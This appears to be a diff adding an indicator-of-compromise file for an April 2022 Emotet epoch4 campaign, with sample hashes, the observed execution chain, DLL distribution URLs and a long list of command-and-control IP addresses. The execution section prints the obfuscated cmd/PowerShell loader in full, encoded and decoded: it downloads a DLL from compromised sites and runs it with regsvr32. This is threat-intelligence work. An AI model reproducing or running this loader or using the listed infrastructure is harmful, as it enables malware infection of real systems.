@@ -1,0 +1,104 @@
+Emotet 2022 | epoch4 | 29.04.2022 | 
+
+************************************************************************************************************
+
+.zip 6594F84689EA36BB680C387DCE3CE64590D0DDF4D98B7075A3843F00E1F09EF6
+.dll 24efce38fc117ce94d1bfb219e9ae86746d98f1bd4ccda3c8c164ef249184080
+.dll aa162e642c6fa55eea5ef194b899c959a0f59cb8f588b57c988d1b1e397e7d2d
+.dll 7341b81222bb1c379c05fa569035b9c76b36f61e89c780559b181c9b70feabc2
+.dll f250ff049bc4c2a817543c514bd3d2fce75bee1e41a9dd7af8e7e8d1e9a3a624
+.dll eff3a298ab9c69b64c6a509471a73c2d89775d119c1cdc4c6f36cb1843a3f905
+
+************************************************************************************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\Rechnungszahlung_2022.29.04_0916.lnk
+
+cmd.exe" /v:on /c l8mFenprlsgvkm45+HWONRPYg1Y6eaQFuPFq31J58SXjob+K8taoiY+7fUNMqIKen6qdgGyr||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c "&{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2djY29uLmluL1VwbG9hZGVkRmlsZXMvVVl0Sk5yVDJsbHh5MS8iLCJodHRwOi8vZ2FrdWRvdS5jb20vcGhvdG8wNi9oRXUvIiwiaHR0cDovL2dpYXNvdHRpLmNvbS9qcy9LaGM2bWIweng0S29XWC8iLCJodHRwOi8vcGxyZXNlbmRlLmNvbS9wY2luZm9yL2NxLyIsImh0dHA6Ly90aG9tYXNtYW50b24uY29tL3dwLWluY2x1ZGVzL293Wm5wV21INEQ4ai8iLCJodHRwOi8vZ2xhLmdlL29sZC9QdVZhZmYvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL2puVVJ4dFJtaU8uU0toO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvam5VUnh0Um1pTy5TS2g7YnJlYWt9IGNhdGNoIHsgfX0=')) > "C:\Users\Admin\AppData\Local\Temp\xLhSBgzPSx.ps1"; powershell -executionpolicy bypass -file "$env:TEMP\xLhSBgzPSx.ps1"; Remove-Item -Force 
+
+powershell.exe  -c "&{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('$ProgressPreference="SilentlyContinue";$links=("http://gccon.in/UploadedFiles/UYtJNrT2llxy1/","http://gakudou.com/photo06/hEu/","http://giasotti.com/js/Khc6mb0zx4KoWX/","http://plresende.com/pcinfor/cq/","http://thomasmanton.com/wp-includes/owZnpWmH4D8j/","http://gla.ge/old/PuVaff/");foreach ($u in $links) {try {IWR $u -OutFile $env:TEMP/jnURxtRmiO.SKh;Regsvr32.exe $env:TEMP/jnURxtRmiO.SKh;break} catch { }}')) > "C:\Users\Admin\AppData\Local\Temp\xLhSBgzPSx.ps1"; powershell -executionpolicy bypass -file "$env:TEMP\xLhSBgzPSx.ps1"; Remove-Item -Force "$env:TEMP\xLhSBgzPSx.ps1"}"
+
+powershell.exe -executionpolicy bypass -file C:\Users\Admin\AppData\Local\Temp\xLhSBgzPSx.ps1
+
+regsvr32.exe C:\Users\Admin\AppData\Local\Temp/jnURxtRmiO.SKh
+
+regsvr32.exe C:\Windows\system32\Ftshgdfi\caogs.lzz
+
+************************************************************************************************************
+
+.dll distro
+
+http://gccon.in/UploadedFiles/UYtJNrT2llxy1/
+http://gakudou.com/photo06/hEu/
+http://giasotti.com/js/Khc6mb0zx4KoWX/
+http://plresende.com/pcinfor/cq/
+http://thomasmanton.com/wp-includes/owZnpWmH4D8j/
+
+************************************************************************************************************
+
+c2's
+
+176.31.73.90:443
+45.76.159.214:8080
+138.197.147.101:443
+104.168.154.79:8080
+149.56.131.28:8080
+5.9.116.246:8080
+77.81.247.144:8080
+172.104.251.154:8080
+50.30.40.196:8080
+173.212.193.249:8080
+51.91.76.89:8080
+197.242.150.244:8080
+103.75.201.2:443
+51.254.140.238:7080
+79.137.35.198:8080
+72.15.201.15:8080
+27.54.89.58:8080
+189.126.111.200:7080
+196.218.30.83:443
+82.165.152.127:8080
+164.68.99.3:8080
+183.111.227.137:8080
+167.172.253.162:8080
+153.126.146.25:7080
+129.232.188.93:443
+151.106.112.196:8080
+188.44.20.25:443
+167.99.115.35:8080
+134.122.66.193:8080
+185.4.135.165:8080
+212.24.98.99:8080
+51.91.7.5:8080
+146.59.226.45:443
+131.100.24.231:80
+212.237.17.99:8080
+201.94.166.162:443
+45.176.232.124:443
+159.65.88.10:8080
+160.16.142.56:8080
+216.158.226.206:443
+203.114.109.124:443
+103.43.46.182:443
+46.55.222.11:443
+209.126.98.206:8080
+91.207.28.33:8080
+1.234.2.232:8080
+45.118.115.99:8080
+206.189.28.199:8080
+94.23.45.86:4143
+158.69.222.101:443
+103.70.28.102:8080
+101.50.0.91:8080
+58.227.42.236:80
+119.193.124.41:7080
+107.182.225.142:8080
+185.157.82.211:8080
+45.235.8.30:8080
+103.132.242.26:8080
+1.234.21.73:7080
+110.232.117.186:8080
+209.97.163.214:443
+185.8.212.130:7080
+209.250.246.206:443
